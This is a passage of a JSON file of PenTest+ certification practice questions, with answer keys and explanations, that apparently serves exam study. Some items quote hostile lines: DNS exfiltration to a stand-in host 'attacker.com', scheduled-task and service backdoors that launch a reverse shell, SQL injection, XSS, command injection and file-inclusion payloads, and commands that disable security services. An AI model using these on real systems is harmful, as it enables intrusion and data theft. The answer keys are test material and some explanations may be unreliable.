      "simulation_details": "Interactive simulation involving analyzing Nmap scan results presented by clicking on WAF, App server, DB server components. User then selects the most likely vulnerability and two remediation options from provided lists/dropdowns.",
      "domain": "4.0 Attacks and Exploits",
      "question_type": "simulation"
    },
    {
      "question_number": 158,
      "question_text": "During an assessment, a penetration tester sends the following request:\nPOST /services/v1/users/create HTTP/1.1\nHost: target-application.com\nContent-Type: application/json\nContent-Length: [dynamic]\nAuthorization: Bearer (FUZZ)\nWhich of the following attacks is the penetration tester performing?",
      "options": {
        "A": "Directory traversal",
        "B": "API abuse",
        "C": "Server-side request forgery",
        "D": "Privilege escalation"
      },
      "correct_answer": "B",
      "explanation": "This attack attempts to manipulate the API by fuzzing the authorization token (Authorization: Bearer \n(FUZZ)). This suggests an attempt to bypass authentication or escalate privileges by using an invalid, stolen, \nor guessed token—a form of API abuse.\n\nOption A (Directory traversal) #:\n\nInvolves manipulating file paths (e.g., ../../../etc/passwd), but this attack targets API \nauthentication.\n\nOption B (API abuse) #:\n\nCorrect. Fuzzing the authorization token suggests an attempt to bypass authentication or test for \nweak API security.\n\nOption C (Server-side request forgery - SSRF) #:\n\nSSRF manipulates backend requests to make unauthorized HTTP calls, which is not evident here.\n\nOption D (Privilege escalation) #:\n\nWhile API abuse may lead to privilege escalation, fuzzing the token alone does not directly \nescalate privileges.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – API Security Testing & Authentication Bypasses",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 108,
      "question_text": "During the reconnaissance phase, a penetration tester collected the following information from the DNS records:\nA-----> www\nA-----> host\nTXT --> vpn.comptia.org\nSPF---> ip =2.2.2.2\nWhich of the following DNS records should be in place to avoid phishing attacks using spoofing domain techniques?",
      "options": {
        "A": "MX",
        "B": "SOA",
        "C": "DMARC",
        "D": "CNAME"
      },
      "correct_answer": "C",
      "explanation": "DMARC (Domain-based Message Authentication, Reporting & Conformance) is an email authentication \nprotocol that helps prevent email spoofing and phishing. It builds on SPF (Sender Policy Framework) and \nDKIM (DomainKeys Identified Mail) to provide a mechanism for email senders and receivers to improve and \nmonitor the protection of the domain from fraudulent email.\n\nUnderstanding DMARC:\n\nSPF: Defines which IP addresses are allowed to send emails on behalf of a domain.\n\nDKIM: Provides a way to check that an email claiming to come from a specific domain was \nindeed authorized by the owner of that domain.\n\nDMARC: Uses SPF and DKIM to determine the authenticity of an email and specifies what \naction to take if the email fails the authentication checks.\n\nImplementing DMARC:\n\nCreate a DMARC policy in your DNS records. This policy can specify to reject, quarantine, or \ntake no action on emails that fail SPF or DKIM checks.\n\nExample DMARC record: v=DMARC1; p=reject; rua=mailto:dmarc-reports@yourdomain.com;\n\nBenefits of DMARC:\n\nHelps to prevent email spoofing and phishing attacks.\n\nProvides visibility into email sources through reports.\n\nEnhances domain reputation by ensuring only legitimate emails are sent from the domain.\n\nDMARC Record Components:\n\nv: Version of DMARC.\n\np: Policy for handling emails that fail the DMARC check (none, quarantine, reject).\n\nrua: Reporting URI of aggregate reports.\n\nruf: Reporting URI of forensic reports.\n\npct: Percentage of messages subjected to filtering.\n\nReal-World Example:\n\nA company sets up a DMARC policy with p=reject to ensure that any emails failing SPF or \nDKIM checks are rejected outright, significantly reducing the risk of phishing attacks using their \ndomain.\n\nReferences from Pentesting Literature:\n\nIn \"Penetration Testing - A Hands-on Introduction to Hacking,\" DMARC is mentioned as part of \nemail security protocols to prevent phishing.\n\nHTB write-ups often highlight the importance of DMARC in securing email communications and \npreventing spoofing attacks.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 112,
      "question_text": "During an assessment, a penetration tester obtains an NTLM hash from a legacy Windows machine. Which of the following tools should the penetration tester use to continue the attack?",
      "options": {
        "A": "Responder",
        "B": "Hydra",
        "C": "BloodHound",
        "D": "CrackMapExec"
      },
      "correct_answer": "D",
      "explanation": "When a penetration tester obtains an NTLM hash from a legacy Windows machine, they need to use a tool \nthat can leverage this hash for further attacks, such as pass-the-hash attacks, or for cracking the hash. Here’s a \nbreakdown of the options:\n\nOption A: Responder\n\nResponder is primarily used for poisoning LLMNR, NBT-NS, and MDNS to capture hashes, but \nnot for leveraging NTLM hashes obtained post-exploitation.\n\nOption B: Hydra\n\nHydra is a password-cracking tool but not specifically designed for NTLM hashes or pass-the hash attacks.\n\nOption C: BloodHound\n\nBloodHound is used for mapping out Active Directory relationships and identifying potential \nattack paths but not for using NTLM hashes directly.\n\nOption D: CrackMapExec\n\nCrackMapExec is a versatile tool that can perform pass-the-hash attacks, execute commands, and \nmore using NTLM hashes. It is designed for post-exploitation scenarios involving NTLM hashes.\n\nReferences from Pentest:\n\nForge HTB: Demonstrates the use of CrackMapExec for leveraging NTLM hashes to gain further \naccess within a network.\n\nHorizontall HTB: Shows how CrackMapExec can be used for various post-exploitation activities, \nincluding using NTLM hashes to authenticate and execute commands.\n\nConclusion:\n\nOption D, CrackMapExec, is the most suitable tool for continuing the attack using an NTLM hash. It supports \npass-the-hash techniques and other operations that can leverage NTLM hashes effectively.\n=================",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 103,
      "question_text": "During an assessment, a penetration tester plans to gather metadata from various online files, including pictures. Which of the following standards outlines the formats for pictures, audio, and additional tags that facilitate this type of reconnaissance?",
      "options": {
        "A": "EXIF",
        "B": "GIF",
        "C": "COFF",
        "D": "ELF"
      },
      "correct_answer": "A",
      "explanation": "Metadata extraction allows attackers to collect sensitive information from digital files.\n\nEXIF (Exchangeable Image File Format) (Option A):\n\nEXIF metadata contains camera details, GPS coordinates, timestamps, and software versions used \nto edit the file.\n\nAttackers use tools like ExifTool to extract metadata for reconnaissance.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 142,
      "question_text": "During a penetration testing exercise, a team decides to use a watering hole strategy. Which of the following is the most effective approach for executing this attack?",
      "options": {
        "A": "Compromise a website frequently visited by the organization's employees.",
        "B": "Launch a DDoS attack on the organization's website.",
        "C": "Create fake social media profiles to befriend employees.",
        "D": "Send phishing emails to the organization's employees."
      },
      "correct_answer": "A",
      "explanation": "Watering Hole Attack Explanation:\n\nA watering hole attack involves compromising a website that the target frequently visits.\n\nThe attacker injects malicious code into the site, which then exploits users who access it.\n\nWhy Not Other Options?\n\nB: DDoS attacks disrupt services but do not align with the watering hole strategy.\n\nC: Social engineering may be effective but is not a watering hole attack.\n\nD: Phishing is unrelated to compromising trusted websites.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 93,
      "question_text": "A penetration tester gains initial access to a target system by exploiting a recent RCE vulnerability. The patch for the vulnerability will be deployed at the end of the week. Which of the following utilities would allow the tester to reenter the system remotely after the patch has been deployed? (Select two).",
      "options": {
        "A": "schtasks.exe",
        "B": "rundll.exe",
        "C": "cmd.exe",
        "D": "chgusr.exe",
        "E": "sc.exe",
        "F": "netsh.exe"
      },
      "correct_answer": "A E",
      "explanation": "To reenter the system remotely after the patch for the recently exploited RCE vulnerability has been deployed, \nthe penetration tester can use schtasks.exe and sc.exe.\n\nschtasks.exe:\n\nPurpose: Used to create, delete, and manage scheduled tasks on Windows systems.\n\nPersistence: By creating a scheduled task, the tester can ensure a script or program runs at a \nspecified time, providing a persistent backdoor.\n\nExample:\n\nschtasks /create /tn \"Backdoor\" /tr \"C:\\path\\to\\backdoor.exe\" /sc daily /ru SYSTEM\n\nsc.exe:\n\nPurpose: Service Control Manager command-line tool used to manage Windows services.\n\nPersistence: By creating or modifying a service to run a malicious executable, the tester can \nmaintain persistent access.\n\nExample:\n\nsc create backdoor binPath= \"C:\\path\\to\\backdoor.exe\" start= auto\n\nOther Utilities:\n\nrundll.exe: Used to run DLLs as applications, not typically used for persistence.\n\ncmd.exe: General command prompt, not specifically used for creating persistence mechanisms.\n\nchgusr.exe: Used to change install mode for Remote Desktop Session Host, not relevant for \npersistence.\n\nnetsh.exe: Used for network configuration, not typically used for persistence.\n\nPentest References:\n\nPost-Exploitation: Establishing persistence is crucial to maintaining access after initial exploitation.\n\nWindows Tools: Understanding how to leverage built-in Windows tools like schtasks.exe and sc.exe to \ncreate backdoors that persist through reboots and patches.\n\nBy using schtasks.exe and sc.exe, the penetration tester can set up persistent mechanisms that will allow \nreentry into the system even after the patch is applied.\n=================",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_multiple_answer"
    },
    {
      "question_number": 64,
      "question_text": "Which of the following is within the scope of proper handling and most crucial when working on a penetration testing report?",
      "options": {
        "A": "Keeping both video and audio of everything that is done",
        "B": "Keeping the report to a maximum of 5 to 10 pages in length",
        "C": "Basing the recommendation on the risk score in the report",
        "D": "Making the report clear for all objectives with a precise executive summary"
      },
      "correct_answer": "D",
      "explanation": "Importance of a Clear Executive Summary:\n\nThe executive summary is essential because it provides decision-makers with a concise overview \nof the findings, risks, and recommendations without requiring deep technical knowledge.\n\nClarity in objectives ensures that all stakeholders understand the purpose, scope, and outcomes of \nthe test.\n\nWhy Not Other Options?\n\nA: Keeping video and audio records is helpful during testing but not typically included in the \nfinal report for handling purposes.\n\nB: Limiting the report to 5–10 pages may compromise its comprehensiveness and omit critical \ndetails.\n\nC: Recommendations based solely on the risk score may not address the broader context or \norganizational priorities.\n\nCompTIA Pentest+ References:\n\nDomain 5.0 (Reporting and Communication)",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 177,
      "question_text": "A penetration tester is enumerating a Linux system. The goal is to modify the following script to provide more comprehensive system information:\n#!/bin/bash\nps aux >> linux_enum.txt\nWhich of the following lines would provide the most comprehensive enumeration of the system?",
      "options": {
        "A": "cat /etc/passwd >> linux_enum.txt; netstat -tuln >> linux_enum.txt; cat /etc/bash.bashrc >> linux_enum.txt",
        "B": "whoami >> linux_enum.txt; uname -a >> linux_enum.txt; ifconfig >> linux_enum.txt",
        "C": "hostname >> linux_enum.txt; echo $USER >> linux_enum.txt; curl ifconfig.me >> linux_enum.txt",
        "D": "lsof -i >> linux_enum.txt; uname -a >> linux_enum.txt; ls /home/ >> linux_enum.txt"
      },
      "correct_answer": "A",
      "explanation": "This command gathers:\n/etc/passwd – lists all local user accounts.\nnetstat -tuln – lists listening ports and associated services.\n/etc/bash.bashrc – contains environment variables and configurations that could reveal system behaviors \nor hidden persistence mechanisms.\nThis provides a much broader and deeper enumeration compared to other options.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 8,
      "question_text": "A penetration tester needs to scan a remote infrastructure with Nmap. The tester issues the following command:\nnmap 10.10.1.0/24\nWhich of the following is the number of TCP ports that will be scanned?",
      "options": {
        "A": "256",
        "B": "1,000",
        "C": "1,024",
        "D": "65,535"
      },
      "correct_answer": "B",
      "explanation": "By default, Nmap scans the top 1,000 most commonly used TCP ports unless otherwise specified.\n\nOption A (256) #: Incorrect. This refers to the number of hosts in a /24 subnet, not the number of ports \nscanned.\n\nOption B (1,000) #: Correct. Nmap defaults to scanning the 1,000 most common TCP ports unless the -\np flag is used to specify a different range.\n\nOption C (1,024) #: Incorrect. The first 1,024 ports are well-known ports, but Nmap scans 1,000 by \ndefault, not 1,024.\n\nOption D (65,535) #: Incorrect. Nmap only scans all ports if the -p- flag is used (e.g., nmap -p- \n<target>).\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Network Scanning with Nmap",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 43,
      "question_text": "A tester is working on an engagement that has evasion and stealth requirements. Which of the following enumeration methods is the least likely to be detected by the IDS?",
      "options": {
        "A": "curl https://api.shodan.io/shodan/host/search?key=<API_KEY>&query=hostname:<target>",
        "B": "proxychains nmap -sV -T2 <target>",
        "C": "for i in <target>; do curl -k $i; done",
        "D": "nmap -sV -T2 <target>"
      },
      "correct_answer": "A",
      "explanation": "Option A uses Shodan’s API to gather information about a target without directly touching the \ntarget system. This makes it the stealthiest option as there's no traffic generated from the tester’s IP to \nthe target.\n\nOptions B & D use Nmap which is active scanning, and while -T2 reduces intensity, it still generates \npackets.\n\nOption C is a custom curl script that also interacts directly with the target and can trigger IDS alerts.\n\nCompTIA PenTest+ Reference:\n\nPT0-003 Objective 2.1 & 2.3: Passive vs Active reconnaissance techniques.\n\nUsing OSINT sources like Shodan is a key stealth recon method.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 145,
      "question_text": "During an engagement, a penetration tester runs the following command against the host system:\nhost -t axfr domain.com dnsl.domain.com\nWhich of the following techniques best describes what the tester is doing?",
      "options": {
        "A": "Zone transfer",
        "B": "Host enumeration",
        "C": "DNS poisoning",
        "D": "DNS query"
      },
      "correct_answer": "A",
      "explanation": "A DNS zone transfer attack occurs when a misconfigured DNS server allows attackers to retrieve the entire \nDNS record set.\n\nZone transfer (Option A):\n\nThe command host -t axfr domain.com dnsl.domain.com requests an AXFR (authoritative \ntransfer) of the DNS records.\n\nThis provides subdomains, email servers, and internal DNS records, which attackers can use for \nreconnaissance.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 169,
      "question_text": "A penetration tester enumerates a legacy Windows host on the same subnet. The tester needs to select exploit methods that will have the least impact on the host's operating stability. Which of the following commands should the tester try first?\n[Nmap output shows port 445 open and smb2-security-mode: Message signing disabled]",
      "options": {
        "A": "responder -I eth0 john responder_output.txt <rdp to target>",
        "B": "hydra -L administrator -P /path/to/pwlist.txt -t 100 rdp://<target_host>",
        "C": "msf > use <module_name> msf > set <options> msf > set PAYLOAD windows/meterpreter /reverse_tcp msf > run",
        "D": "python3 ./buffer_overflow_with_shellcode.py <target> 445"
      },
      "correct_answer": "A",
      "explanation": "Responder is a tool used for capturing and analyzing NetBIOS, LLMNR, and MDNS queries to perform \nvarious man-in-the-middle (MITM) attacks. It can be used to capture hashed credentials, which can then be \ncracked offline. Using Responder has the least impact on the host's operating stability compared to more \naggressive methods like buffer overflow attacks or payload injections.\n\nUnderstanding Responder:\n\nPurpose: Responder is used to capture NTLMv2 hashes from a Windows network.\n\nOperation: It listens on the network for LLMNR, NBT-NS, and MDNS requests and responds to \nthem, tricking the client into authenticating with the attacker's machine.\n\nCommand Breakdown:\n\nresponder -I eth0: Starts Responder on the network interface eth0.\n\njohn responder_output.txt: Uses John the Ripper to crack the hashes captured by Responder.\n\n<rdp to target>: Suggests the next step after capturing credentials might involve using RDP with \nthe cracked password, but the initial capture is passive and low impact.\n\nWhy This is the Best Choice:\n\nLeast Impact: Responder passively captures network traffic without interacting directly with the \ntarget host’s system processes.\n\nStealth: It operates quietly on the network, making it less likely to cause stability issues or be \ndetected by host-based security mechanisms.\n\nReferences from Pentesting Literature:\n\nTools like Responder are discussed in penetration testing guides for initial reconnaissance and \ncredential gathering without causing significant disruptions.\n\nHTB write-ups frequently mention the use of Responder in network-based attacks to capture \ncredentials safely.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 44,
      "question_text": "You are a security analyst tasked with hardening a web server.\nYou have been given a list of HTTP payloads that were flagged as malicious.\nINSTRUCTIONS\nGiven the following attack signatures, determine the attack type, and then identify the associated remediation to prevent the attack in the future.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.\n[Simulation shows various HTTP payloads and dropdowns/checkboxes for selecting Attack Type and Remediation for each payload.]\nPayloads include examples like:\n- `#inner-tab\"><script>alert(1)</script>`\n- `item=widget';waitfor%20delay%20'00:00:20'--`\n- `item=widget%20union%20select%20null,null,@version; --`\n- `search=Bob\"%3e%3cimg%20src%3dax%20onerror%3dalert(1)%3e`\n- `item=widget'+convert(int,@@version)+'`\n- `site=www.exa'ping%20-c%201%20localhost'mple.com`\n- `redir=http:%2f%2fwww.malicious-site.com`\n- `logfile=%2fetc%2fpasswd%00`\n- `lookup=$(whoami)`\n- `logfile=http:%2f%2fwww.malicious-site.com%2fshell.txt`",
      "options": null,
      "correct_answer": null,
      "explanation": "1. `#inner-tab\"><script>alert(1)</script>`: Reflected XSS - Input sanitization (< > ...)\n2. `item=widget';waitfor%20delay%20'00:00:20'--`: SQL Injection (Stacked) - Parameterized Queries\n3. `item=widget%20union%20select%20null,null,@version; --`: SQL Injection (Union) - Parameterized Queries\n4. `search=Bob\"%3e%3cimg%20src%3dax%20onerror%3dalert(1)%3e`: DOM-based Cross Site Scripting - Input Sanitization (< > ...)\n5. `item=widget'+convert(int,@@version)+'` : SQL Injection (Error) - Parameterized queries\n6. `site=www.exa'ping%20-c%201%20localhost'mple.com`: Command Injection - Input Sanitization $ ; | & ...\n7. `redir=http:%2f%2fwww.malicious-site.com`: URL Redirect - Preventing external calls\n8. `logfile=%2fetc%2fpasswd%00`: Local File Inclusion - sandbox req\n9. `lookup=$(whoami)`: Command Injection - sandbox req\n10. `logfile=http:%2f%2fwww.malicious-site.com%2fshell.txt`: Remote File Inclusion - sandbox req",
      "is_simulation": true,
      "simulation_details": "Interactive simulation where the user classifies different HTTP payloads by Attack Type (e.g., Reflected XSS, SQL Injection, Command Injection, LFI, RFI, URL Redirect) and selects the appropriate Remediation (e.g., Input Sanitization, Parameterized Queries, Sandbox req, Preventing external calls) using dropdown menus or checkboxes.",
      "domain": "4.0 Attacks and Exploits",
      "question_type": "simulation"
    },
    {
      "question_number": 223,
      "question_text": "A penetration tester is trying to get unauthorized access to a web application and executes the following command:\nGET /foo/images/file?id=2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\nWhich of the following web application attacks is the tester performing?",
      "options": {
        "A": "Insecure Direct Object Reference",
        "B": "Cross-Site Request Forgery",
        "C": "Directory Traversal",
        "D": "Local File Inclusion"
      },
      "correct_answer": "C",
      "explanation": "The attacker is attempting to access restricted files by navigating directories beyond their intended scope.\n\nDirectory Traversal (Option C):\n\nThe request uses encoded \"../\" sequences (%2e%2e%2f = ../) to move up directories and access \n/etc/passwd.\n\nThis is a classic directory traversal attack aimed at accessing system files.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 16,
      "question_text": "A penetration tester finds it is possible to downgrade a web application's HTTPS connections to HTTP while performing on-path attacks on the local network. The tester reviews the output of the server response to:\ncurl -s -i https://internalapp/\nHTTP/2 302\ndate: Thu, 11 Jan 2024 15:56:24 GMT\ncontent-type: text/html; charset=iso-8659-1\nlocation: /login\nx-content-type-options: nosniff\nserver: Prod\nWhich of the following recommendations should the penetration tester include in the report?",
      "options": {
        "A": "Add the HSTS header to the server.",
        "B": "Attach the httponly flag to cookies.",
        "C": "Front the web application with a firewall rule to block access to port 80.",
        "D": "Remove the x-content-type-options header."
      },
      "correct_answer": "A",
      "explanation": "The tester identified an HTTPS downgrade attack (e.g., SSL stripping). The best mitigation is to enforce \nHSTS (HTTP Strict Transport Security).\n\nHSTS (Option A):\n\nHSTS (Strict-Transport-Security) ensures that the browser always uses HTTPS, preventing \ndowngrade attacks.\n\nExample header:\nStrict-Transport-Security: max-age=31536000; includeSubDomains",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 130,
      "question_text": "A penetration tester downloads a JAR file that is used in an organization's production environment. The tester evaluates the contents of the JAR file to identify potentially vulnerable components that can be targeted for exploit. Which of the following describes the tester's activities?",
      "options": {
        "A": "SAST",
        "B": "SBOM",
        "C": "ICS",
        "D": "SCA"
      },
      "correct_answer": "D",
      "explanation": "The tester’s activity involves analyzing the contents of a JAR file to identify potentially vulnerable \ncomponents. This process is known as Software Composition Analysis (SCA). Here’s why:\n\nUnderstanding SCA:\n\nDefinition: SCA involves analyzing software to identify third-party and open-source components, \nchecking for known vulnerabilities, and ensuring license compliance.\n\nPurpose: To detect and manage risks associated with third-party software components.\n\nComparison with Other Terms:\n\nSAST (A): Static Application Security Testing involves analyzing source code for security \nvulnerabilities without executing the code.\n\nSBOM (B): Software Bill of Materials is a detailed list of all components in a software product, \noften used in SCA but not the analysis itself.\n\nICS (C): Industrial Control Systems, not relevant to the context of software analysis.\n\nThe tester’s activity of examining a JAR file for vulnerable components aligns with SCA, making it the \ncorrect answer.\n=================",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 195,
      "question_text": "A penetration tester gains shell access to a Windows host. The tester needs to permanently turn off protections in order to install additional payload. Which of the following commands is most appropriate?",
      "options": {
        "A": "sc config <svc_name> start=disabled",
        "B": "sc query state= all",
        "C": "pskill <pid_svc_name>",
        "D": "net config <svc_name>"
      },
      "correct_answer": "A",
      "explanation": "Command Explanation:\n\nThe sc config command is used to configure service startup settings in Windows. Using \nstart=disabled will permanently disable a specific service, effectively turning off protections such \nas antivirus or other monitoring services.\n\nWhy Not Other Options?\n\nB (sc query state= all): This command lists all services and their states but does not disable or \nmodify any service.\n\nC (pskill): This command is used to terminate a process temporarily, but it does not permanently \ndisable the service.\n\nD (net config): This command is used for configuring network settings, not for managing services.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nWindows Service Exploitation Guidelines",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 28,
      "question_text": "While performing reconnaissance, a penetration tester attempts to identify publicly accessible ICS (Industrial Control Systems) and IoT (Internet of Things) systems. Which of the following tools is most effective for this task?",
      "options": {
        "A": "theHarvester",
        "B": "Shodan",
        "C": "Amass",
        "D": "Nmap"
      },
      "correct_answer": "B",
      "explanation": "Shodan is a search engine that specializes in finding internet-connected devices, including ICS, IoT, \nwebcams, routers, and servers. Attackers and security professionals use Shodan to scan for publicly accessible \nsystems that may be vulnerable.\n\nOption A (theHarvester) #: theHarvester is primarily used for OSINT (Open-Source Intelligence) \ngathering, such as email addresses, subdomains, and hostnames, but it does not specialize in ICS/IoT \ndiscovery.\n\nOption B (Shodan) #: Correct. Shodan scans the internet for connected devices and services, allowing \npenetration testers to find ICS/IoT systems that are exposed.\n\nOption C (Amass) #: Amass is used for subdomain enumeration and DNS reconnaissance, not for ICS \nor IoT discovery.\n\nOption D (Nmap) #: Nmap is a port scanner that can identify live hosts and open ports, but it does not \nsearch for publicly available systems on a large scale like Shodan.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – OSINT and Reconnaissance",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 133,
      "question_text": "During a security assessment of an e-commerce website, a penetration tester wants to exploit a vulnerability in the web server’s input validation that will allow unauthorized transactions on behalf of the user. Which of the following techniques would most likely be used for that purpose?",
      "options": {
        "A": "Privilege escalation",
        "B": "DOM injection",
        "C": "Session hijacking",
        "D": "Cross-site scripting"
      },
      "correct_answer": "D",
      "explanation": "Comprehensive and Detailed Explanation:\nCross-site scripting (XSS) is a client-side attack where an attacker injects malicious scripts into a web page \nviewed by other users. When executed in a browser, it can steal session cookies, perform unauthorized \ntransactions, or execute malicious actions on behalf of the victim.\n\nOption D (Cross-site scripting) is correct because XSS can manipulate client-side input validation to execute \nunauthorized transactions.\n\nOption A (Privilege escalation) is incorrect because it involves gaining higher privileges on a system, not \nattacking input validation in a web application.\n\nOption B (DOM injection) is incorrect because DOM-based attacks manipulate browser-side JavaScript but \nare not necessarily used for unauthorized transactions.\n\nOption C (Session hijacking) is incorrect because session hijacking requires capturing a valid user session, \nwhereas XSS can steal session tokens for this purpose.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 57,
      "question_text": "A penetration tester has discovered sensitive files on a system. Assuming exfiltration of the files is part of the scope of the test, which of the following is most likely to evade DLP systems?",
      "options": {
        "A": "Encoding the data and pushing through DNS to the tester's controlled server.",
        "B": "Padding the data and uploading the files through an external cloud storage service.",
        "C": "Obfuscating the data and pushing through FTP to the tester's controlled server.",
        "D": "Hashing the data and emailing the files to the tester's company inbox."
      },
      "correct_answer": "A",
      "explanation": "DLP (Data Loss Prevention) systems monitor and block sensitive data transfers over HTTP, FTP, Email, and \nremovable devices.\n\nEncoding the data and exfiltrating through DNS (Option A):\n\nDNS is often overlooked by DLP systems because it is required for network functionality.\n\nAttackers use DNS tunneling (e.g., dnscat2, IODINE) to exfiltrate data inside DNS queries.\n\nExample method\necho \"Sensitive Data\" | base64 | nslookup -q=TXT attacker.com",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 220,
      "question_text": "A tester is finishing an engagement and needs to ensure that artifacts resulting from the test are safely handled. Which of the following is the best procedure for maintaining client data privacy?",
      "options": {
        "A": "Remove configuration changes and any tools deployed to compromised systems.",
        "B": "Securely destroy or remove all engagement-related data from testing systems.",
        "C": "Search through configuration files changed for sensitive credentials and remove them.",
        "D": "Shut down C2 and attacker infrastructure on premises and in the cloud."
      },
      "correct_answer": "B",
      "explanation": "At the end of a penetration test, handling sensitive data properly ensures compliance with legal, regulatory, \nand ethical guidelines.\n\nSecurely destroy or remove all engagement-related data (Option B):\n\nEnsures confidentiality of test results.\n\nPrevents unauthorized access to client information.\n\nMethods include secure wiping tools (shred, sdelete), and encrypted storage deletion.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 52,
      "question_text": "During a security assessment, a penetration tester captures plaintext login credentials on the communication between a user and an authentication system. The tester wants to use this information for further unauthorized access.\nWhich of the following tools is the tester using?",
      "options": {
        "A": "Burp Suite",
        "B": "Wireshark",
        "C": "Zed Attack Proxy (ZAP)",
        "D": "Metasploit"
      },
      "correct_answer": "B",
      "explanation": "Capturing plaintext credentials in network traffic is done using packet sniffing. Wireshark is the best tool for \nthis task.\n\nOption A (Burp Suite) #: Used for web application testing and intercepting HTTPS traffic, but not \ngeneral network sniffing.\n\nOption B (Wireshark) #: Correct.\n\nWireshark is a packet analysis tool that captures unencrypted network traffic, including plaintext \ncredentials.\n\nOption C (ZAP - Zed Attack Proxy) #: Similar to Burp Suite, but focused on web application security, \nnot network packet capture.\n\nOption D (Metasploit) #: Metasploit is used for exploitation rather than capturing traffic.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Packet Sniffing & Network Traffic Analysis",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 139,
      "question_text": "A penetration tester wants to check the security awareness of specific workers in the company with targeted attacks. Which of the following attacks should the penetration tester perform?",
      "options": {
        "A": "Phishing",
        "B": "Tailgating",
        "C": "Whaling",
        "D": "Spear phishing"
      },
      "correct_answer": "D",
      "explanation": "Spear phishing is a targeted email attack aimed at specific individuals within an organization. Unlike general \nphishing, spear phishing is personalized and often involves extensive reconnaissance to increase the \nlikelihood of success.\n\nUnderstanding Spear Phishing:\n\nTargeted Attack: Focuses on specific individuals or groups within an organization.\n\nCustomization: Emails are customized based on the recipient's role, interests, or recent activities.\n\nPurpose:\n\nTesting Security Awareness: Evaluates how well individuals recognize and respond to phishing \nattempts.\n\nInformation Gathering: Attempts to collect sensitive information such as credentials, financial \ndata, or personal details.\n\nProcess:\n\nReconnaissance: Gather information about the target through social media, public records, and \nother sources.\n\nEmail Crafting: Create a convincing email that appears to come from a trusted source.\n\nDelivery and Monitoring: Send the email and monitor for responses or actions taken by the \nrecipient.\n\nReferences from Pentesting Literature:\n\nSpear phishing is highlighted in penetration testing methodologies for testing security awareness \nand the effectiveness of email filtering systems.\n\nHTB write-ups and phishing simulation exercises often detail the use of spear phishing to assess \norganizational security.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 201,
      "question_text": "During an assessment, a penetration tester gains access to one of the internal hosts. Given the following command:\nschtasks /create /sc onlogon /tn \"Windows Update\" /tr \"cmd.exe /c reverse_shell.exe\"\nWhich of the following is the penetration tester trying to do with this code?",
      "options": {
        "A": "Enumerate the scheduled tasks",
        "B": "Establish persistence",
        "C": "Deactivate the Windows Update functionality",
        "D": "Create a binary application for Windows System Updates"
      },
      "correct_answer": "B",
